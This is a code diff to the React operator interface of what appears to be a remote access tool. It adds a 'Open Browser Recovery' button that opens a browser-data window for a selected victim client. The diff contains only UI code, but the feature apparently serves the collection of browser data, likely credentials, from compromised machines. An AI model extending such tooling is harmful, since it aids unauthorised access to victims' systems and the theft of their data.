@@ -16,6 +16,7 @@ import {
   IconX,
   IconShareplay,
   IconTerminal2,
+  IconBrowser,
 } from "@tabler/icons-react";
 import { RemoteDesktopFramePayload } from "../../types";
 import { RATContext } from "../rat/RATContext";
@@ -534,6 +535,21 @@ export const RemoteDesktop: React.FC = () => {
           onMouseLeave={hideTooltip}
         >
           <IconTerminal2 size={24} color="white" className="group-hover:text-black transition-colors" />
+        </button>
+
+        <button
+          className="p-3 rounded-xl shadow-lg backdrop-blur-md bg-secondarybg bg-opacity-80 hover:bg-white hover:bg-opacity-90 transition-all duration-200 cursor-pointer group"
+          onClick={() => {
+            if (addr) {
+              const client = clientList.find(c => c.data.addr === addr);
+              const fullName = client ? `${client.system.username}@${client.system.machine_name}` : addr;
+              openClientWindow(addr, "browser-data", fullName);
+            }
+          }}
+          onMouseEnter={() => showToolTip("Open Browser Recovery")}
+          onMouseLeave={hideTooltip}
+        >
+          <IconBrowser size={24} color="white" className="group-hover:text-black transition-colors" />
         </button>
       </div>
 
